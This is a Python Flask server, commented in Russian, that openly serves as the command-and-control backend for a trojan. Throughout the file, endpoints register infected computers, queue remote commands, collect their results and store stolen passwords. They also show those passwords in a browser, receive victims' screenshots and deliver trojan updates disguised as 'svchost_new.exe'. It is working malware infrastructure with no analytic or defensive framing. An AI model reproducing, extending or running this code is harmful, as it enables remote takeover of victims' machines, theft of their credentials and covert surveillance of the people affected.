from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import json
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

# === ХРАНИЛИЩА ===
clients = {}           # chat_id -> pc_name
results = {}           # chat_id -> последний результат
command_queue = {}     # chat_id -> команда
passwords_storage = {} # chat_id -> пароли

RESULT_FILE = "all_passwords.txt"
PASSWORDS_FILE = "stolen_passwords.txt"

# === РЕГИСТРАЦИЯ ТРОЯНА ===
@app.route('/register/<chat_id>', methods=['POST'])
def register(chat_id):
    try:
        data = request.get_json()
        pc_name = data.get('pc_name', 'Unknown')
        clients[chat_id] = pc_name
        print(f"✅ Зарегистрирован: {chat_id} -> {pc_name}")
        return jsonify({"status": "ok"})
    except Exception as e:
        print(f"Ошибка регистрации: {e}")
        return jsonify({"status": "error"}), 500

# === ПОЛУЧИТЬ СПИСОК КЛИЕНТОВ ===
@app.route('/clients', methods=['GET'])
def get_clients():
    return jsonify(clients)

# === ОТПРАВИТЬ КОМАНДУ ТРОЯНУ ===
@app.route('/cmd/<chat_id>', methods=['POST'])
def send_cmd(chat_id):
    try:
        cmd = request.data.decode()
        command_queue[chat_id] = cmd
        print(f"📤 Команда для {chat_id}: {cmd}")
        return jsonify({"status": "sent"})
    except Exception as e:
        print(f"Ошибка отправки команды: {e}")
        return jsonify({"status": "error"}), 500

# === ТРОЯН ЗАБИРАЕТ КОМАНДУ ===
@app.route('/poll/<chat_id>', methods=['GET'])
def poll(chat_id):
    cmd = command_queue.pop(chat_id, None)
    if cmd:
        return cmd
    return "NO_CMD"

# === ТРОЯН ОТПРАВЛЯЕТ РЕЗУЛЬТАТ ===
@app.route('/result/<chat_id>', methods=['GET'])
def add_result(chat_id):
    try:
        text = request.args.get('data', '')
        if text:
            results[chat_id] = text
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            pc_name = clients.get(chat_id, chat_id)
            
            # Сохраняем в общий файл
            with open(RESULT_FILE, "a", encoding="utf-8") as f:
                f.write(f"[{timestamp}] {pc_name} ({chat_id}): {text}\n")
            
            print(f"📥 Результат от {chat_id}: {text}")
        return jsonify({"status": "ok"})
    except Exception as e:
        print(f"Ошибка сохранения результата: {e}")
        return jsonify({"status": "error"}), 500

# === ПОЛУЧИТЬ ПОСЛЕДНИЙ РЕЗУЛЬТАТ ===
@app.route('/result/<chat_id>', methods=['POST'])
def get_result(chat_id):
    return results.get(chat_id, "NO_RESULT")

# === КРАЖА ПАРОЛЕЙ (НОВЫЙ ЭНДПОИНТ) ===
@app.route('/passwords/<chat_id>', methods=['POST'])
def steal_passwords(chat_id):
    try:
        data = request.get_data(as_text=True)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        pc_name = clients.get(chat_id, chat_id)
        
        # Сохраняем пароли в отдельный файл
        with open(PASSWORDS_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"[{timestamp}] {pc_name} ({chat_id})\n")
            f.write(f"{'='*60}\n")
            f.write(data)
            f.write(f"\n{'='*60}\n")
        
        # Также сохраняем в словарь для API
        if chat_id not in passwords_storage:
            passwords_storage[chat_id] = []
        passwords_storage[chat_id].append({
            "time": timestamp,
            "data": data
        })
        
        print(f"🔐 Пароли получены от {chat_id}")
        return jsonify({"status": "ok"})
    except Exception as e:
        print(f"Ошибка сохранения паролей: {e}")
        return jsonify({"status": "error"}), 500

# === ПОСМОТРЕТЬ ВСЕ ПАРОЛИ (через браузер) ===
@app.route('/view-passwords', methods=['GET'])
def view_passwords():
    if not os.path.exists(PASSWORDS_FILE):
        return "<pre>Паролей пока нет. Запусти кражу через /steal-passwords</pre>"
    with open(PASSWORDS_FILE, "r", encoding="utf-8") as f:
        content = f.read()
    return f"<pre>{content}</pre>"

# === ПОСМОТРЕТЬ ВСЕ РЕЗУЛЬТАТЫ ===
@app.route('/view-results', methods=['GET'])
def view_results():
    if not os.path.exists(RESULT_FILE):
        return "<pre>Результатов пока нет</pre>"
    with open(RESULT_FILE, "r", encoding="utf-8") as f:
        content = f.read()
    return f"<pre>{content}</pre>"

# === СКАЧАТЬ ФАЙЛ С ПАРОЛЯМИ ===
@app.route('/download-passwords', methods=['GET'])
def download_passwords():
    if os.path.exists(PASSWORDS_FILE):
        return send_file(PASSWORDS_FILE, as_attachment=True)
    return "Нет файла с паролями"

# === СКАЧАТЬ ФАЙЛ С РЕЗУЛЬТАТАМИ ===
@app.route('/download-results', methods=['GET'])
def download_results():
    if os.path.exists(RESULT_FILE):
        return send_file(RESULT_FILE, as_attachment=True)
    return "Нет файла с результатами"

# === ПРОВЕРКА ЗДОРОВЬЯ СЕРВЕРА ===
@app.route('/health', methods=['GET'])
def health():
    return "OK"

# === ЗАГРУЗКА СКРИНШОТА ===
@app.route('/upload/<chat_id>', methods=['POST'])
def upload_screenshot(chat_id):
    try:
        if 'screenshot' not in request.files:
            return jsonify({"status": "no file"}), 400
        file = request.files['screenshot']
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{chat_id}_{timestamp}.png"
        
        # Создаём папку для скриншотов, если её нет
        if not os.path.exists('screenshots'):
            os.makedirs('screenshots')
        
        file.save(os.path.join('screenshots', filename))
        print(f"📸 Скриншот от {chat_id} сохранён как {filename}")
        return jsonify({"status": "ok", "filename": filename})
    except Exception as e:
        print(f"Ошибка загрузки скриншота: {e}")
        return jsonify({"status": "error"}), 500

# === ПОЛУЧИТЬ ПОСЛЕДНИЙ СКРИНШОТ ===
@app.route('/screenshot/<chat_id>', methods=['GET'])
def get_screenshot(chat_id):
    try:
        screenshots_dir = 'screenshots'
        if not os.path.exists(screenshots_dir):
            return "Нет скриншотов", 404
        
        # Ищем последний скриншот для этого chat_id
        files = [f for f in os.listdir(screenshots_dir) if f.startswith(f"screenshot_{chat_id}_")]
        if not files:
            return "Нет скриншотов", 404
        
        latest = max(files, key=lambda x: os.path.getctime(os.path.join(screenshots_dir, x)))
        return send_file(os.path.join(screenshots_dir, latest), mimetype='image/png')
    except Exception as e:
        print(f"Ошибка получения скриншота: {e}")
        return "Ошибка", 500

# === ОБНОВЛЕНИЕ ТРОЯНА ===
@app.route('/update/<chat_id>', methods=['GET'])
def update_trojan(chat_id):
    # Путь к новому EXE (загрузи его на сервер в папку updates)
    update_file = "updates/svchost_new.exe"
    if os.path.exists(update_file):
        return send_file(update_file, as_attachment=True)
    return "No update available", 404

if __name__ == '__main__':
    # Создаём необходимые папки
    for folder in ['screenshots', 'updates']:
        if not os.path.exists(folder):
            os.makedirs(folder)
    
    app.run(host='0.0.0.0', port=5000)
